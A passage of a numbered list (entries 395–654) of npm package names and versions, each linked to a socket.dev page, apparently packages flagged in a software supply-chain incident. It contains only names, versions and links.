395. [@silgi/better-auth](https://socket.dev/npm/package/@silgi/better-auth) (v0.8.1)
396. [@silgi/drizzle](https://socket.dev/npm/package/@silgi/drizzle/overview/0.8.4) (v0.8.4)
397. [@silgi/ecosystem](https://socket.dev/npm/package/@silgi/ecosystem) (v0.7.6)
398. [@silgi/graphql](https://socket.dev/npm/package/@silgi/graphql) (v0.7.15)
399. [@silgi/module-builder](https://socket.dev/npm/package/@silgi/module-builder) (v0.8.8)
400. [@silgi/openapi](https://socket.dev/npm/package/@silgi/openapi/overview/0.7.4) (v0.7.4)
401. [@silgi/permission](https://socket.dev/npm/package/@silgi/permission) (v0.6.8)
402. [@silgi/ratelimit](https://socket.dev/npm/package/@silgi/ratelimit) (v0.2.1)
403. [@silgi/scalar](https://socket.dev/npm/package/@silgi/scalar/overview/0.6.2) (v0.6.2)
404. [@silgi/yoga](https://socket.dev/npm/package/@silgi/yoga/overview/0.7.1) (v0.7.1)
405. [@sme-ui/aoma-vevasound-metadata-lib](https://socket.dev/npm/package/@sme-ui/aoma-vevasound-metadata-lib/overview/0.1.3) (v0.1.3)
406. [@strapbuild/react-native-date-time-picker](https://socket.dev/npm/package/@strapbuild/react-native-date-time-picker) (v2.0.4)
407. [@strapbuild/react-native-perspective-image-cropper](https://socket.dev/npm/package/@strapbuild/react-native-perspective-image-cropper) (v0.4.15)
408. [@strapbuild/react-native-perspective-image-cropper-2](https://socket.dev/npm/package/@strapbuild/react-native-perspective-image-cropper-2) (v0.4.7)
409. [@strapbuild/react-native-perspective-image-cropper-poojan31](https://socket.dev/npm/package/@strapbuild/react-native-perspective-image-cropper-poojan31) (v0.4.6)
410. [@suraj_h/medium-common](https://socket.dev/npm/package/@suraj_h/medium-common/overview/1.0.5) (v1.0.5)
411. [@thedelta/eslint-config](https://socket.dev/npm/package/@thedelta/eslint-config/overview/1.0.2) (v1.0.2)
412. [@tiaanduplessis/json](https://socket.dev/npm/package/@tiaanduplessis/json/overview/2.0.3) (v2.0.2, v2.0.3)
413. [@tiaanduplessis/react-progressbar](https://socket.dev/npm/package/@tiaanduplessis/react-progressbar/overview/1.0.2) (v1.0.1, v1.0.2)
414. [@trackstar/angular-trackstar-link](https://socket.dev/npm/package/@trackstar/angular-trackstar-link/files/1.0.2) (v1.0.2)
415. [@trackstar/react-trackstar-link](https://socket.dev/npm/package/@trackstar/react-trackstar-link) (v2.0.21)
416. [@trackstar/react-trackstar-link-upgrade](https://socket.dev/npm/package/@trackstar/react-trackstar-link-upgrade) (v1.1.10)
417. [@trackstar/test-angular-package](https://socket.dev/npm/package/@trackstar/test-angular-package) (v0.0.9)
418. [@trackstar/test-package](https://socket.dev/npm/package/@trackstar/test-package) (v1.1.5)
419. [@trefox/sleekshop-js](https://socket.dev/npm/package/@trefox/sleekshop-js/overview/0.1.6) (v0.1.6)
420. [@trigo/atrix](https://socket.dev/npm/package/@trigo/atrix/overview/7.0.1) (v7.0.1)
421. [@trigo/atrix-acl](https://socket.dev/npm/package/@trigo/atrix-acl/overview/4.0.2) (v4.0.2)
422. [@trigo/atrix-elasticsearch](https://socket.dev/npm/package/@trigo/atrix-elasticsearch/overview/2.0.1) (v2.0.1)
423. [@trigo/atrix-mongoose](https://socket.dev/npm/package/@trigo/atrix-mongoose/overview/1.0.2) (v1.0.2)
424. [@trigo/atrix-orientdb](https://socket.dev/npm/package/@trigo/atrix-orientdb/overview/1.0.2) (v1.0.2)
425. [@trigo/atrix-postgres](https://socket.dev/npm/package/@trigo/atrix-postgres/overview/1.0.3) (v1.0.3)
426. [@trigo/atrix-pubsub](https://socket.dev/npm/package/@trigo/atrix-pubsub/overview/4.0.3) (v4.0.3)
427. [@trigo/atrix-redis](https://socket.dev/npm/package/@trigo/atrix-redis/overview/1.0.2) (v1.0.2)
428. [@trigo/atrix-soap](https://socket.dev/npm/package/@trigo/atrix-soap/overview/1.0.2) (v1.0.2)
429. [@trigo/atrix-swagger](https://socket.dev/npm/package/@trigo/atrix-swagger/overview/3.0.1) (v3.0.1)
430. [@trigo/bool-expressions](https://socket.dev/npm/package/@trigo/bool-expressions/overview/4.1.3) (v4.1.3)
431. [@trigo/eslint-config-trigo](https://socket.dev/npm/package/@trigo/eslint-config-trigo/overview/3.3.1) (v3.3.1)
432. [@trigo/fsm](https://socket.dev/npm/package/@trigo/fsm/overview/3.4.2) (v3.4.2)
433. [@trigo/hapi-auth-signedlink](https://socket.dev/npm/package/@trigo/hapi-auth-signedlink/overview/1.3.1) (v1.3.1)
434. [@trigo/jsdt](https://socket.dev/npm/package/@trigo/jsdt/overview/0.2.1) (v0.2.1)
435. [@trigo/keycloak-api](https://socket.dev/npm/package/@trigo/keycloak-api/overview/1.3.1) (v1.3.1)
436. [@trigo/node-soap](https://socket.dev/npm/package/@trigo/node-soap/overview/0.5.4) (v0.5.4)
437. [@trigo/pathfinder-ui-css](https://socket.dev/npm/package/@trigo/pathfinder-ui-css/overview/0.1.1) (v0.1.1)
438. [@trigo/trigo-hapijs](https://socket.dev/npm/package/@trigo/trigo-hapijs/overview/5.0.1) (v5.0.1)
439. [@trpc-rate-limiter/cloudflare](https://socket.dev/npm/package/@trpc-rate-limiter/cloudflare) (v0.1.4)
440. [@trpc-rate-limiter/hono](https://socket.dev/npm/package/@trpc-rate-limiter/hono) (v0.1.4)
441. [@varsityvibe/api-client](https://socket.dev/npm/package/@varsityvibe/api-client/overview/1.3.36) (v1.3.36)
442. [@varsityvibe/api-client](https://socket.dev/npm/package/@varsityvibe/api-client/overview/1.3.37) (v1.3.37)
443. [@varsityvibe/utils](https://socket.dev/npm/package/@varsityvibe/utils/overview/5.0.6) (v5.0.6)
444. [@varsityvibe/validation-schemas](https://socket.dev/npm/package/@varsityvibe/validation-schemas/overview/0.6.8) (v0.6.7, v0.6.8)
445. [@viapip/eslint-config](https://socket.dev/npm/package/@viapip/eslint-config) (v0.2.4)
446. [@vishadtyagi/full-year-calendar](https://socket.dev/npm/package/@vishadtyagi/full-year-calendar) (v0.1.11)
447. [@voiceflow/alexa-types](https://socket.dev/npm/package/@voiceflow/alexa-types/overview/2.15.61) (v2.15.60, v2.15.61)
448. [@voiceflow/anthropic](https://socket.dev/npm/package/@voiceflow/anthropic/overview/0.4.5) (v0.4.4, v0.4.5)
449. [@voiceflow/api-sdk](https://socket.dev/npm/package/@voiceflow/api-sdk/overview/3.28.59) (v3.28.58, v3.28.59)
450. [@voiceflow/backend-utils](https://socket.dev/npm/package/@voiceflow/backend-utils/overview/5.0.2) (v5.0.1, v5.0.2)
451. [@voiceflow/base-types](https://socket.dev/npm/package/@voiceflow/base-types/overview/2.136.3) (v2.136.2, v2.136.3)
452. [@voiceflow/body-parser](https://socket.dev/npm/package/@voiceflow/body-parser/overview/1.21.3) (v1.21.2, v1.21.3)
453. [@voiceflow/chat-types](https://socket.dev/npm/package/@voiceflow/chat-types/overview/2.14.59) (v2.14.58, v2.14.59)
454. [@voiceflow/circleci-config-sdk-orb-import](https://socket.dev/npm/package/@voiceflow/circleci-config-sdk-orb-import/overview/0.2.2) (v0.2.1, v0.2.2)
455. [@voiceflow/commitlint-config](https://socket.dev/npm/package/@voiceflow/commitlint-config/overview/2.6.2) (v2.6.1, v2.6.2)
456. [@voiceflow/common](https://socket.dev/npm/package/@voiceflow/common/overview/8.9.2) (v8.9.1, v8.9.2)
457. [@voiceflow/default-prompt-wrappers](https://socket.dev/npm/package/@voiceflow/default-prompt-wrappers/overview/1.7.4) (v1.7.3, v1.7.4)
458. [@voiceflow/dependency-cruiser-config](https://socket.dev/npm/package/@voiceflow/dependency-cruiser-config/overview/1.8.12) (v1.8.11, v1.8.12)
459. [@voiceflow/dtos-interact](https://socket.dev/npm/package/@voiceflow/dtos-interact/overview/1.40.2) (v1.40.1, v1.40.2)
460. [@voiceflow/encryption](https://socket.dev/npm/package/@voiceflow/encryption/overview/0.3.3) (v0.3.2, v0.3.3)
461. [@voiceflow/eslint-config](https://socket.dev/npm/package/@voiceflow/eslint-config/overview/7.16.5) (v7.16.4, v7.16.5)
462. [@voiceflow/eslint-plugin](https://socket.dev/npm/package/@voiceflow/eslint-plugin/overview/1.6.2) (v1.6.1, v1.6.2)
463. [@voiceflow/exception](https://socket.dev/npm/package/@voiceflow/exception/overview/1.10.2) (v1.10.1, v1.10.2)
464. [@voiceflow/fetch](https://socket.dev/npm/package/@voiceflow/fetch/overview/1.11.2) (v1.11.1, v1.11.2)
465. [@voiceflow/general-types](https://socket.dev/npm/package/@voiceflow/general-types/overview/3.2.23) (v3.2.22, v3.2.23)
466. [@voiceflow/git-branch-check](https://socket.dev/npm/package/@voiceflow/git-branch-check/overview/1.4.4) (v1.4.3, v1.4.4)
467. [@voiceflow/google-dfes-types](https://socket.dev/npm/package/@voiceflow/google-dfes-types/overview/2.17.13) (v2.17.12, v2.17.13)
468. [@voiceflow/google-types](https://socket.dev/npm/package/@voiceflow/google-types/overview/2.21.13) (v2.21.12, v2.21.13)
469. [@voiceflow/husky-config](https://socket.dev/npm/package/@voiceflow/husky-config/overview/1.3.2) (v1.3.1, v1.3.2)
470. [@voiceflow/logger](https://socket.dev/npm/package/@voiceflow/logger/overview/2.4.3) (v2.4.2, v2.4.3)
471. [@voiceflow/metrics](https://socket.dev/npm/package/@voiceflow/metrics/overview/1.5.2) (v1.5.1, v1.5.2)
472. [@voiceflow/natural-language-commander](https://socket.dev/npm/package/@voiceflow/natural-language-commander/overview/0.5.3) (v0.5.2, v0.5.3)
473. [@voiceflow/nestjs-common](https://socket.dev/npm/package/@voiceflow/nestjs-common/overview/2.75.3) (v2.75.2, v2.75.3)
474. [@voiceflow/nestjs-mongodb](https://socket.dev/npm/package/@voiceflow/nestjs-mongodb/overview/1.3.2) (v1.3.1, v1.3.2)
475. [@voiceflow/nestjs-rate-limit](https://socket.dev/npm/package/@voiceflow/nestjs-rate-limit/overview/1.3.3) (v1.3.2, v1.3.3)
476. [@voiceflow/nestjs-redis](https://socket.dev/npm/package/@voiceflow/nestjs-redis/overview/1.3.2) (v1.3.1, v1.3.2)
477. [@voiceflow/nestjs-timeout](https://socket.dev/npm/package/@voiceflow/nestjs-timeout/overview/1.3.2) (v1.3.1, v1.3.2)
478. [@voiceflow/npm-package-json-lint-config](https://socket.dev/npm/package/@voiceflow/npm-package-json-lint-config/overview/1.1.2) (v1.1.1, v1.1.2)
479. [@voiceflow/openai](https://socket.dev/npm/package/@voiceflow/openai/overview/3.2.3) (v3.2.2, v3.2.3)
480. [@voiceflow/pino](https://socket.dev/npm/package/@voiceflow/pino/overview/6.11.4) (v6.11.3, v6.11.4)
481. [@voiceflow/pino-pretty](https://socket.dev/npm/package/@voiceflow/pino-pretty/overview/4.4.2) (v4.4.1, v4.4.2)
482. [@voiceflow/prettier-config](https://socket.dev/npm/package/@voiceflow/prettier-config/overview/1.10.2) (v1.10.1, v1.10.2)
483. [@voiceflow/react-chat](https://socket.dev/npm/package/@voiceflow/react-chat/overview/1.65.4) (v1.65.3, v1.65.4)
484. [@voiceflow/runtime](https://socket.dev/npm/package/@voiceflow/runtime/overview/1.29.2) (v1.29.1, v1.29.2)
485. [@voiceflow/runtime-client-js](https://socket.dev/npm/package/@voiceflow/runtime-client-js/overview/1.17.3) (v1.17.2, v1.17.3)
486. [@voiceflow/sdk-runtime](https://socket.dev/npm/package/@voiceflow/sdk-runtime/overview/1.43.2) (v1.43.1, v1.43.2)
487. [@voiceflow/secrets-provider](https://socket.dev/npm/package/@voiceflow/secrets-provider/overview/1.9.3) (v1.9.2, v1.9.3)
488. [@voiceflow/semantic-release-config](https://socket.dev/npm/package/@voiceflow/semantic-release-config/overview/1.4.2) (v1.4.1, v1.4.2)
489. [@voiceflow/serverless-plugin-typescript](https://socket.dev/npm/package/@voiceflow/serverless-plugin-typescript/overview/2.1.8) (v2.1.7, v2.1.8)
490. [@voiceflow/slate-serializer](https://socket.dev/npm/package/@voiceflow/slate-serializer/overview/1.7.4) (v1.7.3, v1.7.4)
491. [@voiceflow/stitches-react](https://socket.dev/npm/package/@voiceflow/stitches-react/overview/2.3.3) (v2.3.2, v2.3.3)
492. [@voiceflow/storybook-config](https://socket.dev/npm/package/@voiceflow/storybook-config/overview/1.2.3) (v1.2.2, v1.2.3)
493. [@voiceflow/stylelint-config](https://socket.dev/npm/package/@voiceflow/stylelint-config/overview/1.1.2) (v1.1.1, v1.1.2)
494. [@voiceflow/test-common](https://socket.dev/npm/package/@voiceflow/test-common/overview/2.1.2) (v2.1.1, v2.1.2)
495. [@voiceflow/tsconfig](https://socket.dev/npm/package/@voiceflow/tsconfig/overview/1.12.2) (v1.12.1, v1.12.2)
496. [@voiceflow/tsconfig-paths](https://socket.dev/npm/package/@voiceflow/tsconfig-paths/overview/1.1.5) (v1.1.4, v1.1.5)
497. [@voiceflow/utils-designer](https://socket.dev/npm/package/@voiceflow/utils-designer/overview/1.74.20) (v1.74.19, v1.74.20)
498. [@voiceflow/verror](https://socket.dev/npm/package/@voiceflow/verror/overview/1.1.5) (v1.1.4, v1.1.5)
499. [@voiceflow/vite-config](https://socket.dev/npm/package/@voiceflow/vite-config/overview/2.6.3) (v2.6.2, v2.6.3)
500. [@voiceflow/vitest-config](https://socket.dev/npm/package/@voiceflow/vitest-config/overview/1.10.3) (v1.10.2, v1.10.3)
501. [@voiceflow/voice-types](https://socket.dev/npm/package/@voiceflow/voice-types/overview/2.10.59) (v2.10.58, v2.10.59)
502. [@voiceflow/voiceflow-types](https://socket.dev/npm/package/@voiceflow/voiceflow-types/overview/3.32.46) (v3.32.45, v3.32.46)
503. [@voiceflow/widget](https://socket.dev/npm/package/@voiceflow/widget/overview/1.7.19) (v1.7.18, v1.7.19)
504. [@vucod/email](https://socket.dev/npm/package/@vucod/email) (v0.0.3)
505. [@zapier/ai-actions](https://socket.dev/npm/package/@zapier/ai-actions/overview/0.1.20) (v0.1.18, v0.1.19, v0.1.20)
506. [@zapier/ai-actions-react](https://socket.dev/npm/package/@zapier/ai-actions-react/overview/0.1.14) (v0.1.12, v0.1.13, v0.1.14)
507. [@zapier/babel-preset-zapier](https://socket.dev/npm/package/@zapier/babel-preset-zapier/overview/6.4.3) (v6.4.1, v6.4.2, v6.4.3)
508. [@zapier/browserslist-config-zapier](https://socket.dev/npm/package/@zapier/browserslist-config-zapier/overview/1.0.5) (v1.0.3, v1.0.4, v1.0.5)
509. [@zapier/eslint-plugin-zapier](https://socket.dev/npm/package/@zapier/eslint-plugin-zapier/overview/11.0.5) (v11.0.3, v11.0.4, v11.0.5)
510. [@zapier/mcp-integration](https://socket.dev/npm/package/@zapier/mcp-integration/overview/3.0.3) (v3.0.1, v3.0.2, v3.0.3)
511. [@zapier/secret-scrubber](https://socket.dev/npm/package/@zapier/secret-scrubber/overview/1.1.5) (v1.1.3, v1.1.4, v1.1.5)
512. [@zapier/spectral-api-ruleset](https://socket.dev/npm/package/@zapier/spectral-api-ruleset/overview/1.9.3) (v1.9.1, v1.9.2, v1.9.3)
513. [@zapier/stubtree](https://socket.dev/npm/package/@zapier/stubtree/overview/0.1.4) (v0.1.2, v0.1.3, v0.1.4)
514. [@zapier/zapier-sdk](https://socket.dev/npm/package/@zapier/zapier-sdk/overview/0.15.7) (v0.15.5, v0.15.6, v0.15.7)
515. [02-echo](https://socket.dev/npm/package/02-echo/overview/0.0.7) (v0.0.7)
516. [ai-crowl-shield](https://socket.dev/npm/package/ai-crowl-shield/overview/1.0.7) (v1.0.7)
517. [arc-cli-fc](https://socket.dev/npm/package/arc-cli-fc/overview/1.0.1) (v1.0.1)
518. [asciitranslator](https://socket.dev/npm/package/asciitranslator) (v1.0.3)
519. [asyncapi-preview](https://socket.dev/npm/package/asyncapi-preview) (v1.0.1)
520. [asyncapi-preview](https://socket.dev/npm/package/asyncapi-preview/overview/1.0.2) (v1.0.2)
521. [atrix](https://socket.dev/npm/package/atrix/overview/1.0.1) (v1.0.1)
522. [atrix-mongoose](https://socket.dev/npm/package/atrix-mongoose/overview/1.0.1) (v1.0.1)
523. [automation_model](https://socket.dev/npm/package/automation_model/overview/1.0.491) (v1.0.491)
524. [avvvatars-vue](https://socket.dev/npm/package/avvvatars-vue) (v1.1.2)
525. [axios-builder](https://socket.dev/npm/package/axios-builder) (v1.2.1)
526. [axios-cancelable](https://socket.dev/npm/package/axios-cancelable/files/1.0.2) (v1.0.1, v1.0.2)
527. [axios-timed](https://socket.dev/npm/package/axios-timed/overview/1.0.2) (v1.0.1, v1.0.2)
528. [babel-preset-kinvey-flex-service](https://socket.dev/npm/package/babel-preset-kinvey-flex-service) (v0.1.1)
529. [barebones-css](https://socket.dev/npm/package/barebones-css/overview/1.1.4) (v1.1.3, v1.1.4)
530. [benmostyn-frame-print](https://socket.dev/npm/package/benmostyn-frame-print/overview/1.0.1) (v1.0.1)
531. [best_gpio_controller](https://socket.dev/npm/package/best_gpio_controller) (v1.0.10)
532. [better-auth-nuxt](https://socket.dev/npm/package/better-auth-nuxt) (v0.0.10)
533. [better-queue-nedb](https://socket.dev/npm/package/better-queue-nedb) (v0.1.5)
534. [bidirectional-adapter](https://socket.dev/npm/package/bidirectional-adapter/overview/1.2.3) (v1.2.2, v1.2.3)
535. [bidirectional-adapter](https://socket.dev/npm/package/bidirectional-adapter) (v1.2.4, v1.2.5)
536. [blinqio-executions-cli](https://socket.dev/npm/package/blinqio-executions-cli/overview/1.0.41) (v1.0.41)
537. [blob-to-base64](https://socket.dev/npm/package/blob-to-base64/overview/1.0.3) (v1.0.3)
538. [bool-expressions](https://socket.dev/npm/package/bool-expressions/overview/0.1.2) (v0.1.2)
539. [buffered-interpolation-babylon6](https://socket.dev/npm/package/buffered-interpolation-babylon6) (v0.2.8)
540. [bun-plugin-httpfile](https://socket.dev/npm/package/bun-plugin-httpfile/overview/0.1.1) (v0.1.1)
541. [bytecode-checker-cli](https://socket.dev/npm/package/bytecode-checker-cli/overview/1.0.11) (v1.0.8, v1.0.9, v1.0.10, v1.0.11)
542. [bytes-to-x](https://socket.dev/npm/package/bytes-to-x/overview/1.0.1) (v1.0.1)
543. [calc-loan-interest](https://socket.dev/npm/package/calc-loan-interest/overview/1.0.4) (v1.0.4)
544. [capacitor-plugin-apptrackingios](https://socket.dev/npm/package/capacitor-plugin-apptrackingios/overview/0.0.21) (v0.0.21)
545. [capacitor-plugin-purchase](https://socket.dev/npm/package/capacitor-plugin-purchase/overview/0.1.1) (v0.1.1)
546. [capacitor-plugin-scgssigninwithgoogle](https://socket.dev/npm/package/capacitor-plugin-scgssigninwithgoogle/overview/0.0.5) (v0.0.5)
547. [capacitor-purchase-history](https://socket.dev/npm/package/capacitor-purchase-history/overview/0.0.10) (v0.0.10)
548. [capacitor-voice-recorder-wav](https://socket.dev/npm/package/capacitor-voice-recorder-wav/overview/6.0.3) (v6.0.3)
549. [ceviz](https://socket.dev/npm/package/ceviz) (v0.0.5)
550. [chrome-extension-downloads](https://socket.dev/npm/package/chrome-extension-downloads/overview/0.0.4) (v0.0.3, v0.0.4)
551. [claude-token-updater](https://socket.dev/npm/package/claude-token-updater/overview/1.0.3) (v1.0.3)
552. [coinmarketcap-api](https://socket.dev/npm/package/coinmarketcap-api/overview/3.1.3) (v3.1.2, v3.1.3)
553. [colors-regex](https://socket.dev/npm/package/colors-regex/overview/2.0.1) (v2.0.1)
554. [command-irail ](https://socket.dev/npm/package/command-irail/overview/0.5.4)(v0.5.4)
555. [compare-obj](https://socket.dev/npm/package/compare-obj/overview/1.1.1) (v1.1.1, v1.1.2)
556. [composite-reducer](https://socket.dev/npm/package/composite-reducer/overview/1.0.3) (v1.0.2, v1.0.3, v1.0.4, v1.0.5)
557. [count-it-down](https://socket.dev/npm/package/count-it-down/overview/1.0.1) (v1.0.1, v1.0.2)
558. [cpu-instructions](https://socket.dev/npm/package/cpu-instructions/overview/0.0.14) (v0.0.14)
559. [create-director-app](https://socket.dev/npm/package/create-director-app) (v0.1.1)
560. [create-glee-app](https://socket.dev/npm/package/create-glee-app) (v0.2.2)
561. [create-glee-app](https://socket.dev/npm/package/create-glee-app/overview/0.2.3) (v0.2.3)
562. [create-hardhat3-app](https://socket.dev/npm/package/create-hardhat3-app/overview/1.1.4) (v1.1.1, v1.1.2, v1.1.3, v1.1.4)
563. [create-kinvey-flex-service](https://socket.dev/npm/package/create-kinvey-flex-service) (v0.2.1)
564. [create-mcp-use-app](https://socket.dev/npm/package/create-mcp-use-app/overview/0.5.4) (v0.5.3, v0.5.4)
565. [create-silgi](https://socket.dev/npm/package/create-silgi/overview/0.3.1) (v0.3.1)
566. [crypto-addr-codec](https://socket.dev/npm/package/crypto-addr-codec/overview/0.1.9) (v0.1.9)
567. [css-dedoupe](https://socket.dev/npm/package/css-dedoupe/overview/0.1.2) (v0.1.2)
568. [csv-tool-cli](https://socket.dev/npm/package/csv-tool-cli) (v1.2.1)
569. [dashboard-empty-state](https://socket.dev/npm/package/dashboard-empty-state/overview/1.0.3) (v1.0.3)
570. [designstudiouiux](https://socket.dev/npm/package/designstudiouiux/overview/1.0.1) (v1.0.1)
571. [devstart-cli](https://socket.dev/npm/package/devstart-cli/overview/1.0.6) (v1.0.6)
572. [dialogflow-es](https://socket.dev/npm/package/dialogflow-es/overview/1.1.2) (v1.1.1, v1.1.2, v1.1.3, v1.1.4)
573. [discord-bot-server](https://socket.dev/npm/package/discord-bot-server/overview/0.1.2) (v0.1.2)
574. [docusaurus-plugin-vanilla-extract](https://socket.dev/npm/package/docusaurus-plugin-vanilla-extract/overview/1.0.3) (v1.0.3)
575. [dont-go](https://socket.dev/npm/package/dont-go/overview/1.1.2) (v1.1.2)
576. [dotnet-template](https://socket.dev/npm/package/dotnet-template) (v0.0.3)
577. [dotnet-template](https://socket.dev/npm/package/dotnet-template/overview/0.0.4) (v0.0.4)
578. [drop-events-on-property-plugin](https://socket.dev/npm/package/drop-events-on-property-plugin/overview/0.0.2) (v0.0.2)
579. [easypanel-sdk](https://socket.dev/npm/package/easypanel-sdk) (v0.3.2)
580. [electron-volt](https://socket.dev/npm/package/electron-volt) (v0.0.2)
581. [email-deliverability-tester](https://socket.dev/npm/package/email-deliverability-tester/overview/1.1.1) (v1.1.1)
582. [enforce-branch-name](https://socket.dev/npm/package/enforce-branch-name/overview/1.1.3) (v1.1.3)
583. [esbuild-plugin-brotli ](https://socket.dev/npm/package/esbuild-plugin-brotli/overview/0.2.1)(v0.2.1)
584. [esbuild-plugin-eta](https://socket.dev/npm/package/esbuild-plugin-eta/overview/0.1.1) (v0.1.1)
585. [esbuild-plugin-httpfile](https://socket.dev/npm/package/esbuild-plugin-httpfile/overview/0.4.1) (v0.4.1)
586. [eslint-config-kinvey-flex-service](https://socket.dev/npm/package/eslint-config-kinvey-flex-service) (v0.1.1)
587. [eslint-config-nitpicky](https://socket.dev/npm/package/eslint-config-nitpicky/overview/4.0.1) (v4.0.1)
588. [eslint-config-trigo](https://socket.dev/npm/package/eslint-config-trigo/overview/22.0.2) (v22.0.2)
589. [eslint-config-zeallat-base](https://socket.dev/npm/package/eslint-config-zeallat-base) (v1.0.4)
590. [ethereum-ens](https://socket.dev/npm/package/ethereum-ens/overview/0.8.1) (v0.8.1)
591. [evm-checkcode-cli](https://socket.dev/npm/package/evm-checkcode-cli/overview/1.0.15) (v1.0.12, v1.0.13, v1.0.14, v1.0.15)
592. [exact-ticker](https://socket.dev/npm/package/exact-ticker/overview/0.3.5) (v0.3.5)
593. [expo-audio-session](https://socket.dev/npm/package/expo-audio-session/overview/0.2.1) (v0.2.1)
594. [expo-router-on-rails](https://socket.dev/npm/package/expo-router-on-rails) (v0.0.4)
595. [express-starter-template](https://socket.dev/npm/package/express-starter-template) (v1.0.10)
596. [expressos](https://socket.dev/npm/package/expressos/overview/1.1.3) (v1.1.3)
597. [fat-fingered](https://socket.dev/npm/package/fat-fingered/overview/1.0.2) (v1.0.1, v1.0.2)
598. [feature-flip](https://socket.dev/npm/package/feature-flip/overview/1.0.2) (v1.0.1, v1.0.2)
599. [firestore-search-engine](https://socket.dev/npm/package/firestore-search-engine/overview/1.2.3) (v1.2.3)
600. [fittxt](https://socket.dev/npm/package/fittxt/overview/1.0.3) (v1.0.2, v1.0.3)
601. [flapstacks](https://socket.dev/npm/package/flapstacks/overview/1.0.2) (v1.0.1, v1.0.2)
602. [flatten-unflatten](https://socket.dev/npm/package/flatten-unflatten/overview/1.0.2) (v1.0.1, v1.0.2)
603. [formik-error-focus](https://socket.dev/npm/package/formik-error-focus/overview/2.0.1) (v2.0.1)
604. [formik-store](https://socket.dev/npm/package/formik-store/overview/1.0.1) (v1.0.1)
605. [frontity-starter-theme](https://socket.dev/npm/package/frontity-starter-theme/files/1.0.1) (v1.0.1)
606. [fuzzy-finder](https://socket.dev/npm/package/fuzzy-finder/overview/1.0.6) (v1.0.5, v1.0.6)
607. [gate-evm-check-code2](https://socket.dev/npm/package/gate-evm-check-code2/overview/2.0.6) (v2.0.3, v2.0.4, v2.0.5, v2.0.6)
608. [gate-evm-tools-test](https://socket.dev/npm/package/gate-evm-tools-test/overview/1.0.8) (v1.0.5, v1.0.6, v1.0.7, v1.0.8)
609. [gatsby-plugin-antd](https://socket.dev/npm/package/gatsby-plugin-antd) (v2.2.1)
610. [gatsby-plugin-cname](https://socket.dev/npm/package/gatsby-plugin-cname/overview/1.0.2) (v1.0.1, v1.0.2)
611. [generator-meteor-stock](https://socket.dev/npm/package/generator-meteor-stock/overview/0.1.6) (v0.1.6)
612. [generator-ng-itobuz](https://socket.dev/npm/package/generator-ng-itobuz/overview/0.0.15) (v0.0.15)
613. [get-them-args](https://socket.dev/npm/package/get-them-args/overview/1.3.3) (v1.3.3)
614. [github-action-for-generator](https://socket.dev/npm/package/github-action-for-generator) (v2.1.27)
615. [github-action-for-generator](https://socket.dev/npm/package/github-action-for-generator/overview/2.1.28) (v2.1.28)
616. [gitsafe](https://socket.dev/npm/package/gitsafe/overview/1.0.5) (v1.0.5)
617. [go-template](https://socket.dev/npm/package/go-template) (v0.1.8)
618. [go-template](https://socket.dev/npm/package/go-template/overview/0.1.9) (v0.1.9)
619. [gulp-inject-envs](https://socket.dev/npm/package/gulp-inject-envs/overview/1.2.2) (v1.2.1, v1.2.2)
620. [haufe-axera-api-client](https://socket.dev/npm/package/haufe-axera-api-client/overview/0.0.2) (v0.0.1, v0.0.2)
621. [hope-mapboxdraw](https://socket.dev/npm/package/hope-mapboxdraw/overview/0.1.1) (v0.1.1)
622. [hopedraw](https://socket.dev/npm/package/hopedraw/overview/1.0.3) (v1.0.3)
623. [hover-design-prototype](https://socket.dev/npm/package/hover-design-prototype/overview/0.0.5) (v0.0.5)
624. [httpness](https://socket.dev/npm/package/httpness/overview/1.0.3) (v1.0.2, v1.0.3)
625. [hyper-fullfacing](https://socket.dev/npm/package/hyper-fullfacing/overview/1.0.3) (v1.0.3)
626. [hyperterm-hipster](https://socket.dev/npm/package/hyperterm-hipster/overview/1.0.7) (v1.0.7)
627. [ids-css](https://socket.dev/npm/package/ids-css) (v1.5.1)
628. [ids-enterprise-mcp-server](https://socket.dev/npm/package/ids-enterprise-mcp-server) (v0.0.2)
629. [ids-enterprise-ng](https://socket.dev/npm/package/ids-enterprise-ng) (v20.1.6)
630. [ids-enterprise-typings](https://socket.dev/npm/package/ids-enterprise-typings) (v20.1.6)
631. [image-to-uri](https://socket.dev/npm/package/image-to-uri/overview/1.0.2) (v1.0.1, v1.0.2)
632. [insomnia-plugin-random-pick](https://socket.dev/npm/package/insomnia-plugin-random-pick) (v1.0.4)
633. [invo](https://socket.dev/npm/package/invo/overview/0.2.2) (v0.2.2)
634. [iron-shield-miniapp](https://socket.dev/npm/package/iron-shield-miniapp) (v0.0.2)
635. [ito-button](https://socket.dev/npm/package/ito-button/overview/8.0.3) (v8.0.3)
636. [itobuz-angular](https://socket.dev/npm/package/itobuz-angular/overview/0.0.1) (v0.0.1)
637. [itobuz-angular-auth](https://socket.dev/npm/package/itobuz-angular-auth/overview/8.0.11) (v8.0.11)
638. [itobuz-angular-button](https://socket.dev/npm/package/itobuz-angular-button/overview/8.0.11) (v8.0.11)
639. [jacob-zuma](https://socket.dev/npm/package/jacob-zuma/overview/1.0.2) (v1.0.1, v1.0.2)
640. [jaetut-varit-test](https://socket.dev/npm/package/jaetut-varit-test/overview/1.0.2) (1.0.2)
641. [jan-browser](https://socket.dev/npm/package/jan-browser/overview/0.13.1) (v0.13.1)
642. [jquery-bindings](https://socket.dev/npm/package/jquery-bindings/overview/1.1.3) (v1.1.2, v1.1.3)
643. [jsonsurge](https://socket.dev/npm/package/jsonsurge) (v1.0.7)
644. [just-toasty](https://socket.dev/npm/package/just-toasty/overview/1.7.1) (v1.7.1)
645. [kill-port](https://socket.dev/npm/package/kill-port/overview/2.0.3) (v2.0.2, v2.0.3)
646. [kinetix-default-token-list](https://socket.dev/npm/package/kinetix-default-token-list) (v1.0.5)
647. [kinvey-cli-wrapper](https://socket.dev/npm/package/kinvey-cli-wrapper) (v0.3.1)
648. [kinvey-flex-scripts](https://socket.dev/npm/package/kinvey-flex-scripts) (v0.5.1)
649. [kns-error-code](https://socket.dev/npm/package/kns-error-code) (v1.0.8)
650. [korea-administrative-area-geo-json-util](https://socket.dev/npm/package/korea-administrative-area-geo-json-util/overview/1.0.7) (v1.0.7)
651. [kwami](https://socket.dev/npm/package/kwami/overview/1.5.10) (v1.5.9, v1.5.10)
652. [lang-codes](https://socket.dev/npm/package/lang-codes/overview/1.0.2) (v1.0.1, v1.0.2)
653. [license-o-matic](https://socket.dev/npm/package/license-o-matic/overview/1.2.2) (v1.2.1, v1.2.2)
654. [lint-staged-imagemin](https://socket.dev/npm/package/lint-staged-imagemin/overview/1.3.2) (v1.3.1, v1.3.2)
